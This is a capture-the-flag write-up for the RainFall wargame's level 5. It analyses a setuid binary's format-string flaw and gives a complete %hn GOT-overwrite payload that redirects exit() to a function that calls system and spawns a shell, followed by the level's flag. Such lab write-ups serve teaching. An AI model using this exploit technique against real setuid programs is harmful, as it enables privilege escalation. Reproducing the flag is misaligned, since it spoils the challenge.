# Level5

## 1. Initial Analysis
### 1.1 File Metadata & Persmissions
```bash
level5@RainFall:~$ file ./level5 
./level5: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xed1835fb7b09db7da4238a6fa717ad9fd835ae92, not stripped
```
```bash
level5@RainFall:~$ ls -l level5 
-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
```
- **SetUID (s)**: The binary has the `s` bit on the owner's permissions, meaning it executes with the privileges of the file owner (`level6`) rather than the user running it (`level5`).
- **SetGID (s)**: Similarly, the group ID is set, allowing the process to inherit the `users` group permissions.
- **The Hint**: The goal is to exploit the binary to hijack its execution flow; because of these bits, any shell spawned will inherit `level6` privileges, allowing access to the next level's password.

## 2. Static Analysis with Objdump
```bash
level5@RainFall:~$ objdump -d ./level5
```
```nasm
080484a4 <o>:
 80484a4:	55                   	push   %ebp
 80484a5:	89 e5                	mov    %esp,%ebp
 80484a7:	83 ec 18             	sub    $0x18,%esp
 80484aa:	c7 04 24 f0 85 04 08 	movl   $0x80485f0,(%esp)
 80484b1:	e8 fa fe ff ff       	call   80483b0 <system@plt>
 80484b6:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 80484bd:	e8 ce fe ff ff       	call   8048390 <_exit@plt>

080484c2 <n>:
 80484c2:	55                   	push   %ebp
 80484c3:	89 e5                	mov    %esp,%ebp
 80484c5:	81 ec 18 02 00 00    	sub    $0x218,%esp
 80484cb:	a1 48 98 04 08       	mov    0x8049848,%eax
 80484d0:	89 44 24 08          	mov    %eax,0x8(%esp)
 80484d4:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)
 80484db:	00 
 80484dc:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80484e2:	89 04 24             	mov    %eax,(%esp)
 80484e5:	e8 b6 fe ff ff       	call   80483a0 <fgets@plt>
 80484ea:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80484f0:	89 04 24             	mov    %eax,(%esp)
 80484f3:	e8 88 fe ff ff       	call   8048380 <printf@plt>
 80484f8:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 80484ff:	e8 cc fe ff ff       	call   80483d0 <exit@plt>

08048504 <main>:
 8048504:	55                   	push   %ebp
 8048505:	89 e5                	mov    %esp,%ebp
 8048507:	83 e4 f0             	and    $0xfffffff0,%esp
 804850a:	e8 b3 ff ff ff       	call   80484c2 <n>
 804850f:	c9                   	leave  
 8048510:	c3                   	ret    
 8048511:	90                   	nop
 8048512:	90                   	nop
 8048513:	90                   	nop
 8048514:	90                   	nop
 8048515:	90                   	nop
 8048516:	90                   	nop
 8048517:	90                   	nop
 8048518:	90                   	nop
 8048519:	90                   	nop
 804851a:	90                   	nop
 804851b:	90                   	nop
 804851c:	90                   	nop
 804851d:	90                   	nop
 804851e:	90                   	nop
 804851f:	90                   	nop
```

The function `<n>` contains a classic **Format String Vulnerability**:
```nasm
80484e5:	e8 b6 fe ff ff       	call   80483a0 <fgets@plt>
 80484ea:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80484f0:	89 04 24             	mov    %eax,(%esp)
 80484f3:	e8 88 fe ff ff       	call   8048380 <printf@plt>
 ```
 which is equivalent to print(buffer) in c.

## 3. Why GOT Overwrite?
In previous levels, we exploited format strings to modify local variables that controlled `if` statements. In Level 5, the execution path is linear and ends with a hardcoded call to `exit()`.

There are no conditional checks to manipulate. Therefore, we must use the format string to perform an **Arbitrary Memory Write** on the Global Offset Table (GOT). This allows us to redirect the `exit()` library call to the `o()` function, effectively hijacking the program's control flow at the moment it attempts to terminate.

### 3.1 What is the Global Offset Table (GOT)?
The GOT is a lookup table used by ELF binaries to find the memory addresses of functions stored in external shared libraries (like libc).

- The Purpose: Since library functions move around in memory due to ASLR, the program uses the GOT as a fixed reference point. Think of the GOT as a Phone Book kept on a desk; the program doesn't memorize the "phone number" (address) of exit(), it just knows where to look it up.

- The Process: Instead of jumping to exit() directly, the program jumps to a "stub" (the PLT) that looks inside the GOT to see where the function is located. By using the printf vulnerability as a "pen," we can erase the real number for exit() in this book and write the address for function o() instead.

```bash
level5@RainFall:~$ objdump -R ./level5 

./level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```
### 3.2 Finding the Target and Destination Address
To successfully redirect the program, we need two specific memory addresses: the location where the pointer is stored (GOT) and the location where we want the program to jump (Function o).

The Target (exit@GOT): As shown in the objdump -R output, the GOT entry for exit is at 0x08049838.

```nasm
080484a4 <o>:
 80484a4:	55                   	push   %ebp
 80484a5:	89 e5                	mov    %esp,%ebp
 80484a7:	83 ec 18             	sub    $0x18,%esp
 80484aa:	c7 04 24 f0 85 04 08 	movl   $0x80485f0,(%esp)
 80484b1:	e8 fa fe ff ff       	call   80483b0 <system@plt>
 80484b6:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 80484bd:	e8 ce fe ff ff       	call   8048390 <_exit@plt>
 ```
So, we have find 080484a4 as our destination. Now we have to find the correct offset.

```bash
level5@RainFall:~$ python -c "print 'AAAA' + ' %p'*10" | ./level5
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
```

The good offset is at 4th position

## 4. Exploitation

### 4.1 Payload construction
We perform a Short Write (2 bytes at a time) using %hn to overwrite the GOT entry of exit (0x08049838) with the address of o (0x080484a4).
- Target 1 (High): 0x0804983a -> Value 0x0804 (2052)
- Target 2 (Low): 0x08049838 -> Value 0x84a4 (33956)

The Calculation:
1. Initial Bytes: Two 4-byte addresses = 8 bytes.
2. Padding 1: $2052 - 8 = \mathbf{2044}$ characters for the first write.
3. Padding 2: $33956 - 2052 = \mathbf{31904}$ characters for the second write.

(A common question during this exploit is why we split the write into two 16-bit "short" segments using %hn rather than a single 32-bit "word" write using %n.)

The Problem with %n: To write the address 0x080484a4 in one go, printf would have to output 134,513,828 characters. Generating this much output is extremely slow, often causing the program to hang or be killed by the system.

The Efficiency of %hn: By using %hn, we only write 2 bytes at a time. This allows us to write the "High" part (0x0804) and the "Low" part (0x84a4) separately.

Comparison:

- Writing 0x0804 (High) requires only 2,052 characters.

- Writing 0x84a4 (Low) requires only 33,956 characters.

The Result: Total characters printed is roughly 34,000 instead of 134 million. This makes the exploit nearly instantaneous and much more reliable.

### 4.2 Final Execution
```bash
(python -c "print '\x3a\x98\x04\x08' + '\x38\x98\x04\x08' + '%2044u' + '%4\$hn' + '%31904u' + '%5\$hn'"; cat) | ./level5
```

- The 4th and 5th Offsets: During our stack analysis, we found that our input buffer begins at the 4th position on the stack.

- Since we provided two 4-byte addresses at the very start of our string, the first address (0x0804983a) is located at offset 4.

- The second address (0x08049838) immediately follows it at offset 5.

- %4$hn: This tells printf to take the current character count and write it to the address found at the 4th position on the stack (targeting the high bytes of the GOT).

- %5$hn: This tells printf to take the updated character count and write it to the address found at the 5th position on the stack (targeting the low bytes of the GOT).

## flag
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31